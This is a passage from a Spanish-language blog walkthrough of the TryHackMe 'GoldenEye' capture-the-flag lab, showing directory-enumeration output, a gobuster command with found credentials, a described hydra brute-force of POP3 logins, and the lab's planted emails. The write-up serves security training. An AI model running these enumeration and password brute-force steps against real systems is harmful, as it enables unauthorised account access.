&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~ rustbuster v3.0.3 ~ by phra &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; ps1dr3x ~

         _     _                 _         _           _        _                 _         _           _           _     
        /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    /&lt;span class=&#34;se&#34;&gt;\_\ &lt;/span&gt;             / /&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;     /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;       /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;  
       /  &lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt; / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /         _   / /  &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;    &lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt;     /  &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; 
      / /&lt;span class=&#34;se&#34;&gt;\ \ \ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / /&lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_      /&lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;_  /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_ &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;
     / / /&lt;span class=&#34;se&#34;&gt;\ \_\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;   / / / / /&lt;span class=&#34;se&#34;&gt;\ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /_ &lt;span class=&#34;se&#34;&gt;\ \ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\ &lt;/span&gt; / / /&lt;span class=&#34;se&#34;&gt;\ \_\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;    / / /_/ / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /&lt;span class=&#34;se&#34;&gt;\ \_\ \ &lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_  /   / / /&lt;span class=&#34;se&#34;&gt;\ \ \ \/&lt;/span&gt;___/ / /&lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; /_/_ &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / / /_/ / /
   / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / / / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ / /&lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;__&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;/ / /   / / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   / / /  &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/ /____/&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;  / / /__&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; / 
  / / /_____/ / / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / / /  &lt;span class=&#34;se&#34;&gt;\ \ \_&lt;/span&gt;_// / /   / / _    &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /     / /&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;___&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  / / /_____/  
 / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt; / / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /____&lt;span class=&#34;se&#34;&gt;\_\ \ &lt;/span&gt;/ / /___/ / /_/&lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;_/ / / / / /     / / /______ / / /&lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;   
/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \/&lt;/span&gt; / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /__________/ / /____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt; /&lt;span class=&#34;se&#34;&gt;\ \/&lt;/span&gt;___/ / /_/ /     / / /_______/ / /  &lt;span class=&#34;se&#34;&gt;\ \ \ &lt;/span&gt;  
&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_____________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_________/  &lt;span class=&#34;se&#34;&gt;\_&lt;/span&gt;____&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;  &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;      &lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;__________&lt;span class=&#34;se&#34;&gt;\/&lt;/span&gt;_/    &lt;span class=&#34;se&#34;&gt;\_\/&lt;/span&gt;   


&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started at	: 2020-08-05 17:13:55

GET	&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK				http://golden.thm/
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.php
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.html
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.hta
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.hta.php
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.hta.html
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.hta.txt
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htaccess
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htaccess.php
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htaccess.html
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htaccess.txt
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htpasswd
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htpasswd.php
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htpasswd.html
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/.htpasswd.txt
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://golden.thm/index.html
GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://golden.thm/index.html
GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://golden.thm/server-status
  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;00:03:25&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;########################################   18444/18444   ETA: 00:00:00 req/s: 89&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Ended at: 2020-08-05 17:17:20

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizando GOBUSTER con las credenciales realizamos una busqueda de paginas y directorios en &lt;code&gt;/sev-home/&lt;/code&gt; pero no encontramos nada interesante.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@upset:~/thm/goldeneye# gobuster dir -u http://golden.thm/sev-home/ -w /usr/share/wordlists/dirb/common.txt -P [... REDACTED ...] -U boris -q -t 50 -x php,html,txt
/index.html (Status: 200)
/index.html (Status: 200)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;pop3---hydra&#34;&gt;POP3 - HYDRA&lt;/h2&gt;
&lt;p&gt;Intentamos reutilizar la contraseña junto con los usuarios que encontramos en este servicio pero no funcionaron, por lo que utilizamos hydra para hacer un ataque de fuerza bruta junto con los usuarios y el wordlist rockyou.&lt;/p&gt;
&lt;p&gt;Despues de realizar mas de diez mil intentos no encontramos alguna contraseña (raro en una maquina de THM) con el wordlist rockyou cambiamos de wordlist a uno más pequeño, con el cual encontramos credenciales para los usuarios &lt;code&gt;boris&lt;/code&gt; y &lt;code&gt;natalya&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_172650.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;boris---email&#34;&gt;BORIS - EMAIL&lt;/h3&gt;
&lt;p&gt;Utilizamos las credenciales para leer los correos de boris al igual que en &lt;a href=&#34;https://sckull.github.io/posts/fowsniff/#hydratelnet---pop3&#34;&gt;&lt;strong&gt;Fowsniff CTF - THM&lt;/strong&gt;&lt;/a&gt;, encontramos otros usuarios &lt;code&gt;xenia&lt;/code&gt; y &lt;code&gt;alec&lt;/code&gt;. En los correos hablan sobre codigos de &lt;code&gt;boris&lt;/code&gt;, estos codigos &lt;code&gt;natalya&lt;/code&gt; ha podido romper. Tambien sobre un archivo escondido en el servidor.&lt;/p&gt;

&lt;div id=&#34;5eef4290c6bb646f&#34; class=&#34;codetab&#34;&gt;
  &lt;div class=&#34;codetab__links&#34;&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;correo1&lt;/button&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;correo2&lt;/button&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;correo3&lt;/button&gt;
    
  &lt;/div&gt;
  
  
&lt;div id=&#34;868e3051d5f7d3d0&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;  RETR &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
  +OK &lt;span class=&#34;m&#34;&gt;544&lt;/span&gt; octets
  Return-Path: &amp;lt;root@127.0.0.1.goldeneye&amp;gt;
  X-Original-To: boris
  Delivered-To: boris@ubuntu
  Received: from ok &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;localhost &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
      by ubuntu &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Postfix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; with SMTP id D9E47454B1
      &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &amp;lt;boris&amp;gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Tue, &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1990&lt;/span&gt; 19:22:14 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  Message-Id: &amp;lt;20180425022326.D9E47454B1@ubuntu&amp;gt;
  Date: Tue, &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1990&lt;/span&gt; 19:22:14 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  From: root@127.0.0.1.goldeneye

  Boris, this is admin. You can electronically communicate to co-workers and students here. I&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;m not going to scan emails &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; security risks because I trust you and the other admins here.
  .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

  
&lt;div id=&#34;a1f02858a963a83e&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;  RETR &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
  +OK &lt;span class=&#34;m&#34;&gt;373&lt;/span&gt; octets
  Return-Path: &amp;lt;natalya@ubuntu&amp;gt;
  X-Original-To: boris
  Delivered-To: boris@ubuntu
  Received: from ok &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;localhost &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
      by ubuntu &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Postfix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; with ESMTP id C3F2B454B1
      &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &amp;lt;boris&amp;gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Tue, &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 19:42:35 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  Message-Id: &amp;lt;20180425024249.C3F2B454B1@ubuntu&amp;gt;
  Date: Tue, &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 19:42:35 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  From: natalya@ubuntu

  Boris, I can &lt;span class=&#34;nb&#34;&gt;break&lt;/span&gt; your codes!
  .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

  
&lt;div id=&#34;e7bbc02929a47abd&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;  RETR &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
  +OK &lt;span class=&#34;m&#34;&gt;921&lt;/span&gt; octets
  Return-Path: &amp;lt;alec@janus.boss&amp;gt;
  X-Original-To: boris
  Delivered-To: boris@ubuntu
  Received: from janus &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;localhost &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
      by ubuntu &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Postfix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; with ESMTP id 4B9F4454B1
      &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &amp;lt;boris&amp;gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Wed, &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 19:51:48 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  Message-Id: &amp;lt;20180425025235.4B9F4454B1@ubuntu&amp;gt;
  Date: Wed, &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 19:51:48 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  From: alec@janus.boss

  Boris,

  Your cooperation with our syndicate will pay off big. Attached are the final access codes &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; GoldenEye. Place them in a hidden file within the root directory of this server &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt; remove from this email. There can only be one &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; of these acces codes, and we need to secure them &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the final execution. If they are retrieved and captured our plan will crash and burn!

  Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

  PS - Keep security tight or we will be compromised.

  .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;


&lt;/div&gt;

&lt;script&gt;
  &#39;use strict&#39;;

  var containerId = JSON.parse(&#34;\&#34;5eef4290c6bb646f\&#34;&#34;);
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll(&#39;.codetab__link&#39;);
    codetabContents = containerElem.querySelectorAll(&#39;.codetab__content&#39;);
  }

  for (var i = 0; i &lt; codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute(&#39;id&#39;));
    codetabContents[i].style.display = &#39;none&#39;;

    if (0 === parseInt(i, 10) &amp;&amp; !codetabContents[i].classList.contains(&#39;active&#39;)) {
      codetabContents[i].classList.add(&#39;active&#39;);
    }
  }

  for (var i = 0; i &lt; codetabLinks.length; i++) {
    codetabLinks[i].setAttribute(&#39;id&#39;, ids[i]);

    if (0 === parseInt(i, 10) &amp;&amp; !codetabLinks[i].classList.contains(&#39;active&#39;)) {
      codetabLinks[i].classList.add(&#39;active&#39;);
    } else {
      codetabLinks[i].classList.remove(&#39;active&#39;);
    }
  }

  if (codetabContents.length &gt; 0) {
    codetabContents[0].style.display = &#39;block&#39;;
  }
&lt;/script&gt;
&lt;h3 id=&#34;natalya---email&#34;&gt;NATALYA - EMAIL&lt;/h3&gt;
&lt;p&gt;Utilizamos neuvamente telnet pero esta vez con las credenciales de &lt;code&gt;natalya&lt;/code&gt;, encontramos en uno de los correos las credenciales del usuario &lt;code&gt;xenia&lt;/code&gt;.&lt;/p&gt;

&lt;div id=&#34;ddf4a8c14cc81176&#34; class=&#34;codetab&#34;&gt;
  &lt;div class=&#34;codetab__links&#34;&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;correo1&lt;/button&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;correo2&lt;/button&gt;
    
  &lt;/div&gt;
  
  
&lt;div id=&#34;c735969fd5a60a85&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;  RETR &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
  +OK &lt;span class=&#34;m&#34;&gt;631&lt;/span&gt; octets
  Return-Path: &amp;lt;root@ubuntu&amp;gt;
  X-Original-To: natalya
  Delivered-To: natalya@ubuntu
  Received: from ok &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;localhost &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
  by ubuntu &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Postfix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; with ESMTP id D5EDA454B1
  &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &amp;lt;natalya&amp;gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Tue, &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 19:45:33 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  Message-Id: &amp;lt;20180425024542.D5EDA454B1@ubuntu&amp;gt;
  Date: Tue, &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 19:45:33 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  From: root@ubuntu

  Natalya, please you need to stop breaking boris&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; codes. Also, you are GNO supervisor &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; training. I will email you once a student is designated to you.

